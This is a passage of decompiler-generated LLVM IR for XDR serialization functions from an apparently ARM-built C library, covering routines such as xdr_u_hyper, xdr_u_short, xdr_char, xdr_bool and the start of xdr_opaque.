  store i32 %v3_18220, i32* %stack_var_-20, align 4
  %v0_18224 = load i32, i32* @r0, align 4
  %v1_18224 = inttoptr i32 %v0_18224 to i32*
  %v2_18224 = load i32, i32* %v1_18224, align 4
  store i32 %v2_18224, i32* %r7.global-to-local, align 4
  %v2_18228 = icmp eq i32 %v2_18224, 0
  store i32 %v0_18224, i32* %r5.global-to-local, align 4
  %v0_18234 = load i32, i32* @r1, align 4
  store i32 %v0_18234, i32* %r6.global-to-local, align 4
  br i1 %v2_18228, label %dec_label_pc_1823c, label %dec_label_pc_18288

dec_label_pc_1823c:                               ; preds = %entry
  %v1_1823c = inttoptr i32 %v0_18234 to i32*
  %v2_1823c = load i32, i32* %v1_1823c, align 4
  %v1_18240 = add i32 %v0_18234, 4
  %v2_18240 = inttoptr i32 %v1_18240 to i32*
  %v3_18240 = load i32, i32* %v2_18240, align 4
  store i32 %v2_1823c, i32* %stack_var_-28, align 4
  store i32 %v3_18240, i32* %stack_var_-24, align 4
  %v1_1824c = add i32 %v0_18224, 4
  %v2_1824c = inttoptr i32 %v1_1824c to i32*
  %v3_1824c = load i32, i32* %v2_1824c, align 4
  %v3_18250 = ashr i32 %v3_18240, 31
  store i32 %v3_18250, i32* %r4.global-to-local, align 4
  %v1_18258 = add i32 %v3_1824c, 4
  %v2_18258 = inttoptr i32 %v1_18258 to i32*
  %v3_18258 = load i32, i32* %v2_18258, align 4
  call void @__pseudo_branch(i32 %v3_18258)
  %v0_1825c = load i32, i32* @r0, align 4
  %v2_1825c = icmp eq i32 %v0_1825c, 0
  br i1 %v2_1825c, label %bb, label %dec_label_pc_18268

bb:                                               ; preds = %dec_label_pc_1823c
  %v1_18260 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_18260, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18300

dec_label_pc_18268:                               ; preds = %dec_label_pc_1823c
  %v0_18268 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18268, i32* %r0.global-to-local, align 4
  %v1_1826c = add i32 %v0_18268, 4
  %v2_1826c = inttoptr i32 %v1_1826c to i32*
  %v3_1826c = load i32, i32* %v2_1826c, align 4
  %v1_18278 = add i32 %v3_1826c, 4
  %v2_18278 = inttoptr i32 %v1_18278 to i32*
  %v3_18278 = load i32, i32* %v2_18278, align 4
  call void @__pseudo_branch(i32 %v3_18278)
  %v0_1827c = load i32, i32* %r0.global-to-local, align 4
  %v2_1827c = icmp eq i32 %v0_1827c, 0
  br i1 %v2_1827c, label %dec_label_pc_18300, label %bb10

bb10:                                             ; preds = %dec_label_pc_18268
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18300

dec_label_pc_18288:                               ; preds = %entry
  %v7_18288 = icmp eq i32 %v2_18224, 1
  br i1 %v7_18288, label %dec_label_pc_18290, label %dec_label_pc_182ec

dec_label_pc_18290:                               ; preds = %dec_label_pc_18288
  %v1_18290 = add i32 %v0_18224, 4
  %v2_18290 = inttoptr i32 %v1_18290 to i32*
  %v3_18290 = load i32, i32* %v2_18290, align 4
  %v1_1829c = inttoptr i32 %v3_18290 to i32*
  %v2_1829c = load i32, i32* %v1_1829c, align 4
  call void @__pseudo_branch(i32 %v2_1829c)
  %v0_182a0 = load i32, i32* @r0, align 4
  %v2_182a0 = icmp eq i32 %v0_182a0, 0
  br i1 %v2_182a0, label %dec_label_pc_182fc, label %dec_label_pc_182a8

dec_label_pc_182a8:                               ; preds = %dec_label_pc_18290
  %v0_182a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_182a8, i32* %r0.global-to-local, align 4
  %v1_182ac = add i32 %v0_182a8, 4
  %v2_182ac = inttoptr i32 %v1_182ac to i32*
  %v3_182ac = load i32, i32* %v2_182ac, align 4
  %v1_182b8 = inttoptr i32 %v3_182ac to i32*
  %v2_182b8 = load i32, i32* %v1_182b8, align 4
  call void @__pseudo_branch(i32 %v2_182b8)
  %v0_182bc = load i32, i32* %r0.global-to-local, align 4
  %v2_182bc = icmp eq i32 %v0_182bc, 0
  br i1 %v2_182bc, label %dec_label_pc_182fc, label %dec_label_pc_182c4

dec_label_pc_182c4:                               ; preds = %dec_label_pc_182a8
  %v3_182c4 = load i32, i32* %stack_var_-24, align 4
  %v1_182c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_182c8 = add i32 %v1_182c8, 4
  %v3_182c8 = inttoptr i32 %v2_182c8 to i32*
  store i32 %v3_182c4, i32* %v3_182c8, align 4
  %v1_182d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_182d0 = inttoptr i32 %v1_182d0 to i32*
  store i32 0, i32* %v2_182d0, align 4
  %v2_182d4 = load i32, i32* %stack_var_-28, align 4
  %v0_182d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_182d8 = inttoptr i32 %v0_182d8 to i32*
  %v2_182d8 = load i32, i32* %v1_182d8, align 4
  %v3_182d8 = add i32 %v0_182d8, 4
  %v4_182d8 = inttoptr i32 %v3_182d8 to i32*
  %v5_182d8 = load i32, i32* %v4_182d8, align 4
  store i32 %v5_182d8, i32* %r4.global-to-local, align 4
  %v0_182dc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_182dc, i32* %r0.global-to-local, align 4
  %v2_182e0 = or i32 %v2_182d8, %v2_182d4
  store i32 %v2_182e0, i32* %v1_182d8, align 4
  %v5_182e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_182e4, i32* %v4_182d8, align 4
  %v17_18304.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18300

dec_label_pc_182ec:                               ; preds = %dec_label_pc_18288
  %v7_182ec = icmp eq i32 %v2_18224, 2
  br i1 %v7_182ec, label %.thread1, label %bb11

bb11:                                             ; preds = %dec_label_pc_182ec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18300

.thread1:                                         ; preds = %dec_label_pc_182ec
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18300

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182a8, %dec_label_pc_18290
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18300

dec_label_pc_18300:                               ; preds = %bb, %bb11, %.thread1, %bb10, %dec_label_pc_18268, %dec_label_pc_182c4, %dec_label_pc_182fc
  %v17_18304 = phi i32 [ 1, %.thread1 ], [ 0, %bb11 ], [ 1, %bb10 ], [ 0, %dec_label_pc_18268 ], [ %v1_18260, %bb ], [ %v17_18304.pre, %dec_label_pc_182c4 ], [ 0, %dec_label_pc_182fc ]
  %v2_18304 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_18304, i32* %r4.global-to-local, align 4
  ret i32 %v17_18304

; uselistorder directives
  uselistorder i32 %v0_18224, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8 }
  uselistorder label %dec_label_pc_18300, { 6, 2, 1, 5, 3, 4, 0 }
}

define i32 @xdr_u_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18308 = load i32, i32* @r4, align 4
  store i32 %v3_18308, i32* %stack_var_-16, align 4
  %v0_1830c = load i32, i32* @r0, align 4
  %v1_1830c = inttoptr i32 %v0_1830c to i32*
  %v2_1830c = load i32, i32* %v1_1830c, align 4
  store i32 %v2_1830c, i32* %r6.global-to-local, align 4
  %v2_18310 = icmp eq i32 %v2_1830c, 0
  store i32 %v0_1830c, i32* %r4.global-to-local, align 4
  %v0_1831c = load i32, i32* @r1, align 4
  store i32 %v0_1831c, i32* %r5.global-to-local, align 4
  br i1 %v2_18310, label %dec_label_pc_18324, label %dec_label_pc_18370

dec_label_pc_18324:                               ; preds = %entry
  %v1_18324 = inttoptr i32 %v0_1831c to i32*
  %v2_18324 = load i32, i32* %v1_18324, align 4
  %v1_18328 = add i32 %v0_1831c, 4
  %v2_18328 = inttoptr i32 %v1_18328 to i32*
  %v3_18328 = load i32, i32* %v2_18328, align 4
  store i32 %v2_18324, i32* %stack_var_-24, align 4
  store i32 %v3_18328, i32* %stack_var_-20, align 4
  %v1_18338 = add i32 %v0_1830c, 4
  %v2_18338 = inttoptr i32 %v1_18338 to i32*
  %v3_18338 = load i32, i32* %v2_18338, align 4
  %v1_18340 = add i32 %v3_18338, 4
  %v2_18340 = inttoptr i32 %v1_18340 to i32*
  %v3_18340 = load i32, i32* %v2_18340, align 4
  call void @__pseudo_branch(i32 %v3_18340)
  %v0_18344 = load i32, i32* @r0, align 4
  %v2_18344 = icmp eq i32 %v0_18344, 0
  br i1 %v2_18344, label %bb, label %dec_label_pc_18350

bb:                                               ; preds = %dec_label_pc_18324
  %v1_18348 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v1_18348, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_18350:                               ; preds = %dec_label_pc_18324
  %v0_18350 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18350, i32* %r0.global-to-local, align 4
  %v1_18354 = add i32 %v0_18350, 4
  %v2_18354 = inttoptr i32 %v1_18354 to i32*
  %v3_18354 = load i32, i32* %v2_18354, align 4
  %v1_18360 = add i32 %v3_18354, 4
  %v2_18360 = inttoptr i32 %v1_18360 to i32*
  %v3_18360 = load i32, i32* %v2_18360, align 4
  call void @__pseudo_branch(i32 %v3_18360)
  %v0_18364 = load i32, i32* %r0.global-to-local, align 4
  %v2_18364 = icmp eq i32 %v0_18364, 0
  br i1 %v2_18364, label %dec_label_pc_183e8, label %bb9

bb9:                                              ; preds = %dec_label_pc_18350
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_18370:                               ; preds = %entry
  %v7_18370 = icmp eq i32 %v2_1830c, 1
  br i1 %v7_18370, label %dec_label_pc_18378, label %dec_label_pc_183d4

dec_label_pc_18378:                               ; preds = %dec_label_pc_18370
  %v1_18378 = add i32 %v0_1830c, 4
  %v2_18378 = inttoptr i32 %v1_18378 to i32*
  %v3_18378 = load i32, i32* %v2_18378, align 4
  %v1_18384 = inttoptr i32 %v3_18378 to i32*
  %v2_18384 = load i32, i32* %v1_18384, align 4
  call void @__pseudo_branch(i32 %v2_18384)
  %v0_18388 = load i32, i32* @r0, align 4
  %v2_18388 = icmp eq i32 %v0_18388, 0
  br i1 %v2_18388, label %dec_label_pc_183e4, label %dec_label_pc_18390

dec_label_pc_18390:                               ; preds = %dec_label_pc_18378
  %v0_18390 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18390, i32* %r0.global-to-local, align 4
  %v1_18394 = add i32 %v0_18390, 4
  %v2_18394 = inttoptr i32 %v1_18394 to i32*
  %v3_18394 = load i32, i32* %v2_18394, align 4
  %v1_183a0 = inttoptr i32 %v3_18394 to i32*
  %v2_183a0 = load i32, i32* %v1_183a0, align 4
  call void @__pseudo_branch(i32 %v2_183a0)
  %v0_183a4 = load i32, i32* %r0.global-to-local, align 4
  %v2_183a4 = icmp eq i32 %v0_183a4, 0
  br i1 %v2_183a4, label %dec_label_pc_183e4, label %dec_label_pc_183ac

dec_label_pc_183ac:                               ; preds = %dec_label_pc_18390
  %v3_183ac = load i32, i32* %stack_var_-20, align 4
  %v1_183b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_183b0 = add i32 %v1_183b0, 4
  %v3_183b0 = inttoptr i32 %v2_183b0 to i32*
  store i32 %v3_183ac, i32* %v3_183b0, align 4
  %v1_183b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_183b8 = inttoptr i32 %v1_183b8 to i32*
  store i32 0, i32* %v2_183b8, align 4
  %v2_183bc = load i32, i32* %stack_var_-24, align 4
  %v0_183c0 = load i32, i32* %r5.global-to-local, align 4
  %v1_183c0 = inttoptr i32 %v0_183c0 to i32*
  %v2_183c0 = load i32, i32* %v1_183c0, align 4
  %v3_183c0 = add i32 %v0_183c0, 4
  %v4_183c0 = inttoptr i32 %v3_183c0 to i32*
  %v5_183c0 = load i32, i32* %v4_183c0, align 4
  store i32 %v5_183c0, i32* %r4.global-to-local, align 4
  %v0_183c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_183c4, i32* %r0.global-to-local, align 4
  %v2_183c8 = or i32 %v2_183c0, %v2_183bc
  store i32 %v2_183c8, i32* %v1_183c0, align 4
  %v5_183cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_183cc, i32* %v4_183c0, align 4
  %v14_183ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183d4:                               ; preds = %dec_label_pc_18370
  %v7_183d4 = icmp eq i32 %v2_1830c, 2
  br i1 %v7_183d4, label %.thread1, label %bb10

bb10:                                             ; preds = %dec_label_pc_183d4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183e8

.thread1:                                         ; preds = %dec_label_pc_183d4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183e4:                               ; preds = %dec_label_pc_18390, %dec_label_pc_18378
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183e8:                               ; preds = %bb, %bb10, %.thread1, %bb9, %dec_label_pc_18350, %dec_label_pc_183ac, %dec_label_pc_183e4
  %v14_183ec = phi i32 [ 1, %.thread1 ], [ 0, %bb10 ], [ 1, %bb9 ], [ 0, %dec_label_pc_18350 ], [ %v1_18348, %bb ], [ %v14_183ec.pre, %dec_label_pc_183ac ], [ 0, %dec_label_pc_183e4 ]
  %v2_183ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_183ec, i32* %r4.global-to-local, align 4
  ret i32 %v14_183ec

; uselistorder directives
  uselistorder i32 %v0_1831c, { 1, 0, 2 }
  uselistorder i32 %v0_1830c, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 8 }
  uselistorder label %dec_label_pc_183e8, { 6, 2, 1, 5, 3, 4, 0 }
}

define i32 @xdr_longlong_t() local_unnamed_addr {
entry:
  %v0_183f0 = call i32 @__GI_xdr_hyper()
  ret i32 %v0_183f0
}

define i32 @xdr_u_longlong_t(i32* %xdrs, i64* %ullp) local_unnamed_addr {
entry:
  %v0_183f4 = call i32 @xdr_u_hyper()
  ret i32 %v0_183f4
}

define i32 @__GI_xdr_u_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_183f8 = load i32, i32* @r4, align 4
  store i32 %v3_183f8, i32* %stack_var_-12, align 4
  %v0_183fc = load i32, i32* %r0.global-to-local, align 4
  %v1_183fc = inttoptr i32 %v0_183fc to i32*
  %v2_183fc = load i32, i32* %v1_183fc, align 4
  store i32 %v2_183fc, i32* %r4.global-to-local, align 4
  %v7_18404 = icmp eq i32 %v2_183fc, 1
  store i1 %v7_18404, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_18404, label %dec_label_pc_18450, label %dec_label_pc_18414

dec_label_pc_18414:                               ; preds = %entry
  %v2_18404 = icmp eq i32 %v2_183fc, 0
  br i1 %v2_18404, label %dec_label_pc_1842c, label %dec_label_pc_1841c

dec_label_pc_1841c:                               ; preds = %dec_label_pc_18414
  %v7_1841c = icmp eq i32 %v2_183fc, 2
  store i1 %v7_1841c, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v7_1841c, label %dec_label_pc_1847c, label %dec_label_pc_18478

dec_label_pc_1842c:                               ; preds = %dec_label_pc_18414
  %v1_1842c = add i32 %arg2, 1
  %v2_1842c = inttoptr i32 %v1_1842c to i8*
  %v3_1842c = load i8, i8* %v2_1842c, align 1
  %v4_1842c = zext i8 %v3_1842c to i32
  %v1_18430 = inttoptr i32 %arg2 to i8*
  %v2_18430 = load i8, i8* %v1_18430, align 1
  %v3_18430 = zext i8 %v2_18430 to i32
  %v4_18434 = mul nuw nsw i32 %v4_1842c, 256
  %v5_18434 = or i32 %v3_18430, %v4_18434
  store i32 %v5_18434, i32* %r2.global-to-local, align 4
  store i8 %v2_18430, i8* %stack_var_-16, align 1
  %v1_18440 = add i32 %v0_183fc, 4
  %v2_18440 = inttoptr i32 %v1_18440 to i32*
  %v3_18440 = load i32, i32* %v2_18440, align 4
  %v1_18448 = add i32 %v3_18440, 4
  %v2_18448 = inttoptr i32 %v1_18448 to i32*
  %v3_18448 = load i32, i32* %v2_18448, align 4
  call void @__pseudo_branch(i32 %v3_18448)
  br label %dec_label_pc_1847c

dec_label_pc_18450:                               ; preds = %entry
  %v1_18450 = add i32 %v0_183fc, 4
  %v2_18450 = inttoptr i32 %v1_18450 to i32*
  %v3_18450 = load i32, i32* %v2_18450, align 4
  %v1_18458 = inttoptr i32 %v3_18450 to i32*
  %v2_18458 = load i32, i32* %v1_18458, align 4
  call void @__pseudo_branch(i32 %v2_18458)
  %v0_1845c = load i32, i32* %r0.global-to-local, align 4
  %v2_1845c = icmp eq i32 %v0_1845c, 0
  store i1 %v2_1845c, i1* %cpsr_z.global-to-local, align 1
  %v0_18460 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18460, i32* %r0.global-to-local, align 4
  br i1 %v2_1845c, label %dec_label_pc_18478, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18450
  %v3_18464 = load i8, i8* %stack_var_-16, align 1
  %v4_18464 = sext i8 %v3_18464 to i32
  store i32 %v4_18464, i32* %r2.global-to-local, align 4
  %v4_18468 = sdiv i32 %v4_18464, 256
  %v2_1846c = trunc i32 %v4_18468 to i8
  %v3_1846c = load i32, i32* %r5.global-to-local, align 4
  %v4_1846c = add i32 %v3_1846c, 1
  %v5_1846c = inttoptr i32 %v4_1846c to i8*
  store i8 %v2_1846c, i8* %v5_1846c, align 1
  %v0_18470.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18470.pr.pr, label %dec_label_pc_18478, label %.thread3

.thread3:                                         ; preds = %.thread2
  %v1_18470 = load i32, i32* %r2.global-to-local, align 4
  %v2_18470 = trunc i32 %v1_18470 to i8
  %v3_18470 = load i32, i32* %r5.global-to-local, align 4
  %v4_18470 = inttoptr i32 %v3_18470 to i8*
  store i8 %v2_18470, i8* %v4_18470, align 1
  %v0_18474.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18474.pr.pr.pr, label %dec_label_pc_18478, label %dec_label_pc_1847c

dec_label_pc_18478:                               ; preds = %dec_label_pc_18450, %.thread2, %.thread3, %dec_label_pc_1841c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1847c

dec_label_pc_1847c:                               ; preds = %dec_label_pc_1841c, %.thread3, %dec_label_pc_1842c, %dec_label_pc_18478
  %v2_18480 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18480, i32* %r4.global-to-local, align 4
  %v11_18480 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_18480

; uselistorder directives
  uselistorder i32 %v2_183fc, { 0, 2, 1, 3 }
  uselistorder i8* %stack_var_-16, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1847c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_18478, { 2, 1, 0, 3 }
}

define i32 @xdr_char(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i8, align 1
  %stack_var_-8 = alloca i32, align 4
  %v3_18484 = load i32, i32* @r4, align 4
  store i32 %v3_18484, i32* %stack_var_-8, align 4
  %v3_18488 = load i8, i8* %arg1, align 1
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i8 %v3_18488, i8* %stack_var_-12, align 1
  %v0_184a0 = call i32 @__GI_xdr_int()
  store i32 %v0_184a0, i32* %r0.global-to-local, align 4
  %v2_184a4 = icmp eq i32 %v0_184a0, 0
  br i1 %v2_184a4, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v3_184a8 = load i8, i8* %stack_var_-12, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_184b0 = load i32, i32* %r4.global-to-local, align 4
  %v4_184b0 = inttoptr i32 %v3_184b0 to i8*
  store i8 %v3_184a8, i8* %v4_184b0, align 1
  %v8_184b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v8_184b8 = phi i32 [ 0, %entry ], [ %v8_184b8.pre, %bb ]
  %v2_184b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_184b8, i32* %r4.global-to-local, align 4
  ret i32 %v8_184b8

; uselistorder directives
  uselistorder i8* %stack_var_-12, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @xdr_u_char(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i8, align 1
  %v3_184c0 = load i8, i8* %arg1, align 1
  %v2_184c4 = ptrtoint i8* %stack_var_-12 to i32
  store i32 %tmp, i32* @r4, align 4
  store i8 %v3_184c0, i8* %stack_var_-12, align 1
  store i32 %v2_184c4, i32* @r1, align 4
  %v2_184d8 = bitcast i8* %stack_var_-12 to i32*
  %v4_184d8 = call i32 @xdr_u_int(i32* %v2_184d8, i32* %v2_184d8)
  store i32 %v4_184d8, i32* %r0.global-to-local, align 4
  %v2_184dc = icmp eq i32 %v4_184d8, 0
  br i1 %v2_184dc, label %.thread2, label %bb

bb:                                               ; preds = %entry
  %v3_184e0 = load i8, i8* %stack_var_-12, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_184e8 = load i32, i32* @r4, align 4
  %v4_184e8 = inttoptr i32 %v3_184e8 to i8*
  store i8 %v3_184e0, i8* %v4_184e8, align 1
  %v8_184f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  %v8_184f0 = phi i32 [ 0, %entry ], [ %v8_184f0.pre, %bb ]
  ret i32 %v8_184f0

; uselistorder directives
  uselistorder i8* %stack_var_-12, { 3, 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @xdr_bool(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_184f4 = load i32, i32* @r4, align 4
  store i32 %v3_184f4, i32* %stack_var_-12, align 4
  %v0_184f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_184f8 = inttoptr i32 %v0_184f8 to i32*
  %v2_184f8 = load i32, i32* %v1_184f8, align 4
  store i32 %v2_184f8, i32* %r4.global-to-local, align 4
  %v7_18500 = icmp eq i32 %v2_184f8, 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v7_18500, label %dec_label_pc_1854c, label %dec_label_pc_18510

dec_label_pc_18510:                               ; preds = %entry
  %v2_18500 = icmp eq i32 %v2_184f8, 0
  br i1 %v2_18500, label %dec_label_pc_18528, label %dec_label_pc_18518

dec_label_pc_18518:                               ; preds = %dec_label_pc_18510
  %v7_18518 = icmp eq i32 %v2_184f8, 2
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v7_18518, label %dec_label_pc_1857c, label %dec_label_pc_18578

dec_label_pc_18528:                               ; preds = %dec_label_pc_18510
  %v1_18528 = inttoptr i32 %arg2 to i32*
  %v2_18528 = load i32, i32* %v1_18528, align 4
  %v2_1852c = icmp eq i32 %v2_18528, 0
  br i1 %v2_1852c, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_18528
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_18528, %bb
  %v0_18538 = phi i32 [ 0, %dec_label_pc_18528 ], [ 1, %bb ]
  %v1_18534 = add i32 %v0_184f8, 4
  %v2_18534 = inttoptr i32 %v1_18534 to i32*
  %v3_18534 = load i32, i32* %v2_18534, align 4
  store i32 %v0_18538, i32* %stack_var_-16, align 4
  %v1_18544 = add i32 %v3_18534, 4
  %v2_18544 = inttoptr i32 %v1_18544 to i32*
  %v3_18544 = load i32, i32* %v2_18544, align 4
  call void @__pseudo_branch(i32 %v3_18544)
  br label %dec_label_pc_1857c

dec_label_pc_1854c:                               ; preds = %entry
  %v1_1854c = add i32 %v0_184f8, 4
  %v2_1854c = inttoptr i32 %v1_1854c to i32*
  %v3_1854c = load i32, i32* %v2_1854c, align 4
  %v1_18554 = inttoptr i32 %v3_1854c to i32*
  %v2_18554 = load i32, i32* %v1_18554, align 4
  call void @__pseudo_branch(i32 %v2_18554)
  %v0_18558 = load i32, i32* %r0.global-to-local, align 4
  %v2_18558 = icmp eq i32 %v0_18558, 0
  %v0_1855c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1855c, i32* %r0.global-to-local, align 4
  br i1 %v2_18558, label %dec_label_pc_18578, label %dec_label_pc_18564

dec_label_pc_18564:                               ; preds = %dec_label_pc_1854c
  %v2_18564 = load i32, i32* %stack_var_-16, align 4
  %v2_18568 = icmp eq i32 %v2_18564, 0
  br i1 %v2_18568, label %bb10, label %bb9

bb9:                                              ; preds = %dec_label_pc_18564
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18564, %bb9
  %v0_18570 = phi i32 [ 0, %dec_label_pc_18564 ], [ 1, %bb9 ]
  %v1_18570 = load i32, i32* %r5.global-to-local, align 4
  %v2_18570 = inttoptr i32 %v1_18570 to i32*
  store i32 %v0_18570, i32* %v2_18570, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18578:                               ; preds = %dec_label_pc_18518, %dec_label_pc_1854c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_1857c:                               ; preds = %dec_label_pc_18518, %bb10, %bb8, %dec_label_pc_18578
  %v2_18580 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18580, i32* %r4.global-to-local, align 4
  %v11_18580 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v11_18580

; uselistorder directives
  uselistorder i32 %v2_184f8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1857c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_18578, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @xdr_enum() local_unnamed_addr {
entry:
  %v0_18584 = call i32 @__GI_xdr_long()
  ret i32 %v0_18584
}

define i32 @xdr_opaque(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v2_18588 = icmp eq i32 %arg2, 0
  %v3_1858c = load i32, i32* @r4, align 4
  store i32 %v3_1858c, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_18588, label %dec_label_pc_18638, label %dec_label_pc_18598

dec_label_pc_18598:                               ; preds = %entry
  %v2_18598 = load i32, i32* %arg1, align 4
  %v1_1859c = urem i32 %arg2, 4
  %v2_1859c = icmp eq i32 %v1_1859c, 0
  %v2_185a4 = sub nsw i32 4, %v1_1859c
  %storemerge = select i1 %v2_1859c, i32 0, i32 %v2_185a4
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_185a8 = icmp eq i32 %v2_18598, 1
  br i1 %v7_185a8, label %dec_label_pc_185d8, label %dec_label_pc_185b0

dec_label_pc_185b0:                               ; preds = %dec_label_pc_18598
  %v2_185a8 = icmp eq i32 %v2_18598, 0
  br i1 %v2_185a8, label %dec_label_pc_18614, label %dec_label_pc_185b4

dec_label_pc_185b4:                               ; preds = %dec_label_pc_185b0
  %v7_185b4 = icmp eq i32 %v2_18598, 2
  br i1 %v7_185b4, label %dec_label_pc_18638, label %dec_label_pc_18640

dec_label_pc_185d8:                               ; preds = %dec_label_pc_18598
  %v1_185c4 = add i32 %tmp, 4
  %v2_185c4 = inttoptr i32 %v1_185c4 to i32*
  %v3_185c4 = load i32, i32* %v2_185c4, align 4
  store i32 99792, i32* @lr, align 4
  %v1_185cc = add i32 %v3_185c4, 8
  %v2_185cc = inttoptr i32 %v1_185cc to i32*
  %v3_185cc = load i32, i32* %v2_185cc, align 4
  call void @__pseudo_branch(i32 %v3_185cc)
  %v0_185d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_185d8 = icmp eq i32 %v0_185d8, 0
